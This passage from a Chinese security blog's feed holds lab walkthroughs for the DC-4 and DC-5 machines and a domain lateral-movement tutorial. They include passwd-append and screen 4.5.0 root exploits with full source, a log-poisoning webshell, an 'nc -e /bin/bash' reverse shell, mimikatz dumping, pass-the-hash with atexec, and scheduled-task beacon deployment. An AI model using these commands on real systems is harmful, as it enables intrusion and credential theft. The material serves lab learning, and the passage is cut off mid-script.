alt="image-20240827181315069"></p><p>登录成功</p><p><img src="https://bu.dusays.com/2024/10/11/670935d0e8bd3.png" alt="image-20240827181609567"></p><p>这里提示jim有一封邮件</p><p>找下邮件呢</p><p><img src="https://bu.dusays.com/2024/10/11/670935cef0d0c.png" alt="image-20240827182221902"></p><p>在mail下有jim</p><p>看下</p><p><img src="https://bu.dusays.com/2024/10/11/670935d4252f7.png" alt="image-20240827182334555"></p><p>发现密码</p><p>^xHhA&amp;hvim0y</p><p>所以我们又得到一组密码</p><blockquote><p>charles<br>^xHhA&amp;hvim0y</p></blockquote><p>再ssh登录一下</p><p><code>ssh charles@192.168.31.179 -p 22</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935c1b9857.png" alt="image-20240827182635269"></p><p>登录成功</p><p>先看下权限吧</p><p><code>sudo -l</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935b8e6376.png" alt="image-20240827182921401"></p><p>发现使用&#x2F;usr&#x2F;bin&#x2F;teehee 切换到root权限是不需要密码</p><p>这里我们需要使用teehee提权</p><blockquote><p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee提权</a></p><p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</p><p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p></blockquote><p>所以</p><p><code>sudo teehee -a /etc/passwd</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827184315699.png" alt="image-20240827184315699"></p><p>然后</p><p><code>ABC::0:0:::/bin/bash</code></p><p>ctrl+c</p><p><code>su ABC</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935d1487fd.png" alt="image-20240827184727040"></p><p>也可直接使用:<code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd &amp;&amp; su raaj</code>来提权</p><h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h2><p>信息收集吧</p><p><code>arp-scan -l</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935d181b6d.png" alt="image-20240827185914970"></p><p>所以靶机ip</p><p>192.168.31.127</p><p>具体扫下</p><p><code>nmap -sV -p- 192.168.31.127</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935cd4d105.png" alt="image-20240827190141995"></p><p>开放了2个端口</p><p>访问一下吧</p><p><img src="https://bu.dusays.com/2024/10/11/670935ba73c62.png" alt="image-20240827190443986"></p><p>没啥用</p><p>whatweb看下呢</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827190647365.png" alt="image-20240827190647365"></p><p>没啥用</p><p>dirsearch扫下呢</p><p><img src="https://bu.dusays.com/2024/10/11/670935d41d0bb.png" alt="image-20240827191351999"></p><p>有几个php文件</p><p>访问看看呢</p><p>contact.php</p><p><img src="https://bu.dusays.com/2024/10/11/670935b6888ae.png" alt="image-20240827192351830"></p><p>页面有个submit</p><p>footer.php</p><p><img src="https://bu.dusays.com/2024/10/11/670935a118bea.png" alt="image-20240827192700712"></p><p>页面的数字在刷新之后会变化</p><p>thankyou.php</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827192900080.png" alt="image-20240827192900080"></p><p>刷新数字会变</p><p>可能thankyou.php和footer.php有点关系</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828142057922.png" alt="image-20240828142057922"></p><p>我们抓下thankyou.php呢</p><p>爆破一下服务器变量名 试下文件包含</p><p>这里用bp自带的字典</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828143937656.png" alt="image-20240828143937656"></p><p>确实有的</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828144106705.png" alt="image-20240828144106705"></p><p>变量名是file</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828144221519.png" alt="image-20240828144221519"></p><p>确实有文件包含</p><p>又由前面得知是nginx服务器,所以可以尝试包含日志access.log</p><blockquote><p>访问日志主要记录客户端的请求。客户端向Nginx服务器发起的每一次请求都记录在这里。客户端IP，浏览器信息，referer，请求处理时间，请求URL等都可以在访问日志中得到。</p><p>位置:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log (Nginx服务器)</p><p>错误日志目录：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/670935ca1888a.png" alt="image-20240828144445228"></p><p>包含成功</p><p>这样的话 我们就可以上传一句话木马了</p><p>直接上传就行</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828150411695.png" alt="image-20240828150411695"></p><p>再看下日志呢</p><p><img src="https://bu.dusays.com/2024/10/11/670935cba8949.png" alt="image-20240828150851150"></p><p>上传成功</p><p>蚁剑连接</p><p>这里蚁剑如果返回空 可以试下UA传一句话木马</p><p><img src="https://bu.dusays.com/2024/10/11/670935a880007.png" alt="image-20240828152954904"></p><p>好 我们现在反弹shell到kali上来</p><p><code>nc -lvnp 6363</code></p><p><code>nc -e /bin/bash 192.168.31.63 6363</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935d0c5bd8.png" alt="image-20240828153406740"></p><p>python弄个交互式shell</p><p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828153540213.png" alt="image-20240828153540213"></p><p>先看下sudo呢</p><p><code>sudo -l</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828153644026.png" alt="image-20240828153644026"></p><p>不行</p><p>那我们看下suid呢</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935c796271.png" alt="image-20240828153748809"></p><p>没有我们需要的关键字</p><p>说明suid提权不行</p><p>那我们看看这里面有没有漏洞 用searchsploit</p><p>找到这个</p><p><code>searchsploit screen 4.5.0</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935b8e6394.png" alt="image-20240828154013201"></p><p>我们根据这个poc来打</p><p><code>searchsploit -p 41152.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935ad5e201.png" alt="image-20240828154948856"></p><p><code>searchsploit screen 4.5.0 -m 41154.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935c855418.png" alt="image-20240828162122495"></p><p>没啥用</p><p>我们看看那个sh文件</p><p><code>cat /usr/share/exploitdb/exploits/linux/local/41154.sh</code></p><p>这个也可以</p><p><code>searchsploit -x linux/local/41154.sh</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935cf5b7fe.png" alt="image-20240828162452256"></p><p>有东西</p><p>简单来讲就是新建 libhax.c 和 rootshell.c 两个文件。把对应的内容写进去，然后编译，再把把最下方的内容存储到.sh文件里面，上传到靶机的&#x2F;tmp目录里面执行即可</p><p>好</p><p>按照要求先在kali将41154.sh中上面面一部分c语言代码另存为libhax.c文件，内容如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670935a132cee.png" alt="image-20240828162749519"></p><p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p><p>编译</p><p><img src="https://bu.dusays.com/2024/10/11/670935bf5b722.png" alt="image-20240828162856519"></p><p>将41154.sh中下面一部分c语言代码另存为rootshell.c，内容如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><p><code>gcc -o rootshell rootshell.c</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935d2502d0.png" alt="image-20240828163023495"></p><p>除去c语言部分，将剩下的内容另存为dc5.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># screenroot.sh</span><br><span class="line"># setuid screen v4.5.0 local root exploit</span><br><span class="line"># abuses ld.so.preload overwriting to get root.</span><br><span class="line"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (25/1/2017) </span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828163403846.png" alt="image-20240828163403846"></p><p>好 我们把这些文件放到目标主机上 &#x2F;tmp路径里</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828163754024.png" alt="image-20240828163754024"></p><p>cd到tmp目录</p><p>看下权限</p><p><img src="https://bu.dusays.com/2024/10/11/670935cd1a125.png" alt="image-20240828163946017"></p><p>给dc5.sh赋权</p><p><code>chmod 777 dc5.sh</code></p><p><code>./dc5.sh</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935c9b65e9.png" alt="image-20240828164739597"></p><p>这里提权失败了，，这里发现是 GLBC的版本不对，导致编译出来的文件不能成功提权</p><p>我Kali的GLBC版本太高了 不能超过2.3.4</p><p><img src="https://bu.dusays.com/2024/10/11/670935b3f247b.png" alt="image-20240828164902143"></p><p>靶机的可以</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828164959362.png" alt="image-20240828164959362"></p><p>我们把rootshell.c放给靶机 让靶机编译</p><p>可以了</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240828165617307.png" alt="image-20240828165617307"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/670935d234908.png" alt="image-20240828170413595"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动</title>
      <link href="/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="横向移动之前"><a href="#横向移动之前" class="headerlink" title="横向移动之前"></a>横向移动之前</h3><p>靶场学习</p><p>拓扑图</p><p><img src="https://bu.dusays.com/2024/10/11/670933673e160.png" alt="image-20240913221753133"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>cs上线webserver</p><p><img src="https://bu.dusays.com/2024/10/11/67093365c3478.png" alt="image-20240913222219986"></p><p>先看下他是不是内网用户</p><p><code>shell net user /domain</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335b87914.png" alt="image-20240913222353463"></p><p>是</p><p>且域内用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator            boss                     dbadmin                  </span><br><span class="line">debian                   devadmain                fedora                   </span><br><span class="line">fileadmin                Guest                    hr                       </span><br><span class="line">itadmin                  jenkins                  kali                     </span><br><span class="line">klion                    klionsec                 krbtgt                   </span><br><span class="line">logers                   logtest                  mack                     </span><br><span class="line">mary                     SM_6ef9b5ce414946ae9     SM_c330a5709f6a478b8     </span><br><span class="line">SM_d3853544b62a421fb     SM_d80bb46e75164f258     vpnadm                   </span><br><span class="line">webadmin</span><br></pre></td></tr></table></figure><p>且 域控：</p><p>OWA2010CN-God.god.org</p><p>ping命令确定域控</p><p><code>shell ping OWA2010CN-God.god.org </code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335c323cb.png" alt="image-20240913223015766"></p><p>域控ip：</p><p>192.168.3.21</p><p>cs端口扫描一下</p><p><img src="https://bu.dusays.com/2024/10/11/6709336781be0.png" alt="image-20240913223126521"></p><p><img src="https://bu.dusays.com/2024/10/11/6709335a2b366.png" alt="image-20240913223201437"></p><p><img src="https://bu.dusays.com/2024/10/11/67093359c0f5a.png" alt="image-20240913224717664"></p><p>192.168.3.30不知道为什么没有扫出来</p><p>问题不大</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>cs简单提下权</p><p>因为这里重点是学习横向移动 所以提权就简单一点</p><p>总之就是要拿到system权限</p><p><img src="https://bu.dusays.com/2024/10/11/6709335d6ce26.png" alt="image-20240913223416126"></p><p><img src="https://bu.dusays.com/2024/10/11/67093358b22b9.png" alt="image-20240913223435076"></p><p>提权成功</p><p><img src="https://bu.dusays.com/2024/10/11/67093359a687f.png" alt="image-20240913223502856"></p><p><strong>因为是本地靶场 就不权限维持了</strong></p><h4 id="凭证抓取"><a href="#凭证抓取" class="headerlink" title="凭证抓取"></a>凭证抓取</h4><p>为了更好的在域内进行横向渗透</p><p>我们需要抓取凭证</p><p>这里使用cs抓</p><p>用system的权限抓</p><p><img src="https://bu.dusays.com/2024/10/11/67093365b3893.png" alt="image-20240913224250200"></p><p>抓取hash和抓取明文密码都可以</p><p>他们调用的都是猕猴桃工具–mimikatz</p><p><img src="https://bu.dusays.com/2024/10/11/670933586c36b.png" alt="image-20240913224417639"></p><p>抓到</p><p><img src="https://bu.dusays.com/2024/10/11/67093363752b9.png" alt="image-20240913224450585"></p><p>把hash也抓了</p><p><img src="https://bu.dusays.com/2024/10/11/67093368b055a.png" alt="image-20240913224534560"></p><p>不管是抓到明文密码还是hash都是可以进行传递的</p><h3 id="IPC横向移动"><a href="#IPC横向移动" class="headerlink" title="IPC横向移动"></a>IPC横向移动</h3><p>做好了前面的一系列前置操作后</p><p>我们就可以对域控进行攻击了</p><p>这里我们用到的是IPC横向移动</p><blockquote><p><strong>IPC（Inter-Process Communication）协议是指用于不同进程之间进行通信和数据交换的协议。</strong>在操作系统中，进程是指正在运行的程序的实例。进程可以是同一应用程序的不同实例，也可以是不同应用程序之间的独立实例。进程之间的通信是实现多任务、协作和数据交换的关键。</p></blockquote><blockquote><p>IPC协议提供了一套规范和机制，使不同进程能够安全、可靠地进行通信。它允许进程之间共享数据、传递消息、进行同步操作等。常见的IPC协议包括以下几种：</p><ul><li><p>管道（Pipe）：管道是一种半双工的通信机制，可用于在父子进程或者兄弟进程之间进行通信。在Unix和Linux系统中，管道可以通过创建一个管道文件描述符来实现进程间通信。</p></li><li><p>命名管道（Named Pipe）：命名管道是一种有名的管道，它允许无亲缘关系的进程进行通信。命名管道在文件系统中有一个唯一的名字，进程可以通过该名字打开和使用管道进行通信。</p></li><li><p>消息队列（Message Queue）：消息队列是一种按照消息进行通信的机制。进程可以将消息发送到消息队列中，其他进程可以从队列中接收和处理消息。消息队列通常具有先进先出的特性，并提供了一种异步通信的方式。</p></li><li><p>共享内存（Shared Memory）：共享内存允许不同进程访问同一块内存区域，从而实现高效的数据共享。多个进程可以将共享内存映射到各自的地址空间中，以便直接读写共享数据，避免了数据复制和传输的开销。</p></li><li><p>套接字（Socket）：套接字是一种网络编程中常用的IPC机制，它允许不同主机上的进程进行网络通信。套接字提供了一种可靠的、面向连接的通信方式，可以通过TCP或UDP协议在网络中传输数据。</p></li><li><p>信号量（Semaphore）：信号量是一种用于同步进程的机制，它可以用来保护共享资源，控制进程的访问顺序，以及实现进程间的互斥和同步操作。</p></li></ul></blockquote><p>总之我们可以通过IPC 对目标发起一个管道链接 我们可以通过这个管道链接对目标进行一些操作</p><p>使用流程</p><ul><li>建立IPC连接到目标</li><li>拷贝要执行的木马到目标主机</li><li>执行木马(计划任务)</li><li>删除IPC</li></ul><h4 id="建立IPC连接到目标"><a href="#建立IPC连接到目标" class="headerlink" title="建立IPC连接到目标"></a>建立IPC连接到目标</h4><p>at计划任务打DC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接  这里的用户密码都是webserver的</span><br><span class="line"></span><br><span class="line">copy beacon.exe \\192.168.3.21\c$ #拷贝执行文件到目标机器</span><br><span class="line"></span><br><span class="line">net time#获取服务器时间</span><br><span class="line"></span><br><span class="line">at \\192.168.3.21 20:42 c:\beacon.exe  #添加计划任务</span><br><span class="line"></span><br><span class="line">connect 192.168.3.21 4444    #正向连接木马</span><br></pre></td></tr></table></figure><p>schtasks计划任务打DC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接：</span><br><span class="line"></span><br><span class="line">copy beacon.exe \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line"></span><br><span class="line">schtasks /S 192.168.3.32 /U administrator /P Admin12345 /Create /TN beacon /TR &#x27;c:\beacon.exe&#x27; /SC once /f #创beacon任务对应执行文件</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class="line"></span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn beacon /f#删除beacon任务</span><br></pre></td></tr></table></figure><p>建立IPC连接</p><p><code>shell net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335b3f98a.png" alt="image-20240913230822560"></p><p>看下连没连上</p><p><code>shell net use</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335bdb743.png" alt="image-20240913231051692"></p><p>好</p><p>但是现在我们是不能直接用木马让DC连接到kali</p><p>因为DC不出网 </p><p>但是DC是可以和webserver正常通信的</p><p>所以我们要用webserver主机作为跳板 让DC连接它 再间接连接到我们的卡kali</p><p>新建一个正向监听</p><p><img src="https://bu.dusays.com/2024/10/11/670933635252b.png" alt="image-20240913231625318"></p><p>生成木马</p><p><img src="https://bu.dusays.com/2024/10/11/67093365f05af.png" alt="image-20240913231747535"></p><p>注意这里要生成无状态可执行程序</p><p>区分：</p><p>无状态可执行程序–&gt;unstager</p><p>可执行程序–&gt;stager</p><p><strong>stager:</strong></p><p>首先生成的paylod为stager，是一个小程序，通常是手工优化的汇编指令，用于远程下载一个 payload stage，将其注入到当前被执行服务器内存，对其传达指令</p><p><strong>靶机向cs服务器发送了一个下载请求，请求下载真正的payload</strong></p><p><strong>unstager：</strong></p><p>unstage为部分阶段的payload，所有指令都集成到了里面</p><p>它生成一个叫beacon.exe，双击运行后我们并不会在Web日志中看到任何请求信息。因为unstage会将所有的利用代码一开始就集中到了beacon.exe</p><h4 id="拷贝要执行的木马到目标主机"><a href="#拷贝要执行的木马到目标主机" class="headerlink" title="拷贝要执行的木马到目标主机"></a>拷贝要执行的木马到目标主机</h4><h5 id="IPC连接拷贝"><a href="#IPC连接拷贝" class="headerlink" title="IPC连接拷贝"></a>IPC连接拷贝</h5><p>先把我们的beacon.exe弄到webshell主机上</p><p><img src="https://bu.dusays.com/2024/10/11/6709335a2ba7d.png" alt="image-20240913233128492"></p><p>然后用命令拷贝</p><p><code>copy beacon.exe \\192.168.3.21\c$</code></p><p>拷到C盘</p><p>当然 也可以加上路径</p><p><img src="https://bu.dusays.com/2024/10/11/6709335a2a21e.png" alt="image-20240913233605428"></p><h4 id="计划任务执行木马"><a href="#计划任务执行木马" class="headerlink" title="计划任务执行木马"></a>计划任务执行木马</h4><h5 id="正向连接上线"><a href="#正向连接上线" class="headerlink" title="正向连接上线"></a>正向连接上线</h5><p>首先我们需要获取一下服务器的时间</p><p><code>shell net time</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335859914.png" alt="image-20240913234330462"></p><p>根据时间</p><p>我们添加一下计划任务</p><p><code>shell at \\192.168.3.21 20:42 c:\beacon.exe</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335ab53f9.png" alt="image-20240913234756570"></p><p>等待计划任务执行</p><p>因为我们开的的正向连接的木马 所以我们要用webserver去绑定4444端口</p><p><code>connect 192.168.3.21 4444 </code></p><p><img src="https://bu.dusays.com/2024/10/11/67093368f1387.png" alt="image-20240913235545753"></p><p>直接上线</p><h5 id="反向连接上线"><a href="#反向连接上线" class="headerlink" title="反向连接上线"></a>反向连接上线</h5><p>当然因为webserver和DC是互通的</p><p>我们也可以用反向连接</p><p>webserver的system权限转发上线来建监听器</p><p><img src="https://bu.dusays.com/2024/10/11/6709336713bb6.png" alt="image-20240914000023637"></p><p>配置一下</p><p><img src="https://bu.dusays.com/2024/10/11/670933659739b.png" alt="image-20240914000139829"></p><p>生成木马并上传到webserver</p><p><img src="https://bu.dusays.com/2024/10/11/6709335cbb7ea.png" alt="image-20240914000222642"></p><p><img src="https://bu.dusays.com/2024/10/11/6709336422af8.png" alt="image-20240914000337771"></p><p>IPC拷贝过去</p><p><code>shell copy fx.exe \\192.168.3.21\c$</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335af223b.png" alt="image-20240914000816911"></p><p>计划任务执行一下</p><p>环境问题 这里我没有上线成功</p><p>但是是可以上线的</p><h4 id="插件IPC移动"><a href="#插件IPC移动" class="headerlink" title="插件IPC移动"></a>插件IPC移动</h4><p><img src="https://bu.dusays.com/2024/10/11/67093369946b8.png" alt="image-20240914004111192"></p><p>插件内置了IPC移动</p><p>拿下DC后就可以随便打了</p><p>这里我们打一下marry–&gt;192.168.3.25</p><p><img src="https://bu.dusays.com/2024/10/11/670933598470d.png" alt="image-20240914004331496"></p><p>连接建立成功</p><p><img src="https://bu.dusays.com/2024/10/11/6709335eb360b.png" alt="image-20240914004420936"></p><h4 id="IPC常见报错"><a href="#IPC常见报错" class="headerlink" title="IPC常见报错"></a>IPC常见报错</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</span><br><span class="line">（2）51：网络问题，Windows 无法找到网络路径</span><br><span class="line">（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有防火墙等问题</span><br><span class="line">（4）67：找不到网络名（本地主机中lanmanworkstation服务未启动或者目标主机删除了ipc$）。</span><br><span class="line">（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</span><br><span class="line">（6）1326：账号密码错误</span><br><span class="line">（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</span><br><span class="line">（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure><h3 id="套件-impacket-ipc"><a href="#套件-impacket-ipc" class="headerlink" title="套件-impacket-ipc"></a>套件-impacket-ipc</h3><p>本身它需要有python环境才能执行</p><p>这里我们用魔改版</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240914005539046.png" alt="image-20240914005539046"></p><p>里面有很多exe程序</p><p>我们用第一个就行</p><p>先把文件传到webserver上去</p><p><img src="https://bu.dusays.com/2024/10/11/6709336989d33.png" alt="image-20240914005749139"></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CS本地用户明文连接：</span><br><span class="line"></span><br><span class="line">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">CS域内用户明文连接：</span><br><span class="line"></span><br><span class="line">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line"></span><br><span class="line">CS域内本地用户明文密文连接：</span><br><span class="line"></span><br><span class="line">本地用户hash传递</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">域用户hash传递</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><code>shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</code></p><p>这里的第二个.表示本地 如果是域的话要用域名</p><p><code>shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709335bd4884.png" alt="image-20240914010017769"></p><p>根据命令</p><p>我们抓到的hash也是可以传递执行命令的</p><p><img src="https://bu.dusays.com/2024/10/11/6709336603068.png" alt="image-20240914010230317"></p><p><code>shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093359e9204.png" alt="image-20240914010616672"></p><p>工具生成一下命令</p><p><img src="https://bu.dusays.com/2024/10/11/670933663d7f3.png" alt="image-20240914010955504"></p><p>随便找个cmd的命令</p><p>这个dc.exe是一个基于DC的反向连接的木马</p><p>将whoami换成我们生成的命令</p><p><img src="https://bu.dusays.com/2024/10/11/67093367e1c37.png" alt="image-20240914011143184"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67093358f3bf1.png" alt="image-20240914011214951"></p><p>执行木马</p><p><img src="https://bu.dusays.com/2024/10/11/6709335cb6189.png" alt="image-20240914011315563"></p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67093368eec9c.png" alt="image-20240914011344330"></p><p><strong>这也就是IPC通过web下载文件的形式来进行横向移动</strong></p><p>但是他也有弊端</p><p>1.上传套件–套件比较大–容易被杀软识别</p><p>2.使用python脚本–可能目标没有python环境</p><p>解决：</p><h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><p>使用socket节点可实现无文件落地</p><p>在webserver与本地上建立socket节点 这样本地就会映射到webserver 那么就意味着我们无需将我们需要的文件放到域内 就可以使用</p><p><img src="https://bu.dusays.com/2024/10/11/67093368691b1.png" alt="image-20240914012218846"></p><p>配置一下</p><p><img src="https://bu.dusays.com/2024/10/11/67093359ce5be.png" alt="image-20240914012253979"></p><p>proxifier连接</p><p><img src="https://bu.dusays.com/2024/10/11/6709335a6b79d.png" alt="image-20240914013644894"></p><p><img src="https://bu.dusays.com/2024/10/11/6709336399d60.png" alt="image-20240914013556965"></p><p>这里的ip是kali的ip</p><p>再建立一个CS新规则</p><p><img src="https://bu.dusays.com/2024/10/11/6709335d72393.png" alt="image-20240914013722338"></p><p><img src="https://bu.dusays.com/2024/10/11/67093365423e4.png" alt="image-20240914013746857"></p><p>任何只要是192.168.3的都会把流量转发到192.168.10.172代理服务器</p><p>这样本地就可以直接访问内网了</p><p><img src="https://bu.dusays.com/2024/10/11/670933659e423.png" alt="image-20240914013955337"></p><p>这样的话我们就可以直接在本地执行套件了</p><p>找到刚才那个exe的python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933693ff5a.png" alt="image-20240914014226811"></p><p>成功</p><p>python脚本批量执行下载木马并执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line"></span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span 